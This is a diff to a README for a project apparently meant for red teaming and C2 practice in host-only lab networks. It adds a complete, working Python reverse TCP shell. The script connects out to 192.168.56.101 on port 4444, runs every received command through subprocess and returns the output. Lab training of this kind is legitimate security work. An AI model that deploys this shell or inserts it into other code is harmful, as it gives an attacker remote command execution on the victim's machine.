@@ -10,7 +10,7 @@ This shell is built for:
 - Command & Control (C2) development
 - Penetration testing and adversary emulation
 - Ethical red teaming environments
-
+  
 ## 💻 Features
 
 - Reverse TCP shell over socket
@@ -23,6 +23,30 @@ This shell is built for:
 - Arch Linux / Kali Linux
 - Windows 10 (x86/x64) via VirtualBox
 - Host-only networks
+
+ ```import socket
+import subprocess
+
+def reverse_shell(host='192.168.56.101', port=4444):
+    try:
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.connect((host, port))
+
+        while True:
+            command = client.recv(1024).decode("utf-8")
+            if command.lower() in ['exit', 'quit']:
+                break
+            output = subprocess.getoutput(command)
+            client.send(output.encode("utf-8"))
+
+    except Exception as e:
+        print(f"[!] Error: {e}")
+    finally:
+        client.close()
+
+if __name__ == "__main__":
+    reverse_shell()
+``` 
 
 ## 🚀 Usage
 
